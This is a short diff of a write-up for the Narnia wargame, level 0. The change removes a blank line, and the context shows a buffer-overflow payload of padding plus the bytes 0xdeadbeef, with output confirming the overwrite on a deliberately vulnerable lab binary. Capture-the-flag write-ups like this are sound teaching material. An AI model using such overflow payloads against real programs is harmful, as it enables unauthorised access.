@@ -103,7 +103,6 @@ Alternatively, print the string, and copy & paste it to get the the narnia1 shel
 ```bash
 narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
 AAAAAAAAAAAAAAAAAAAAﾭޯ
-
 narnia0@narnia:/narnia$ ./narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
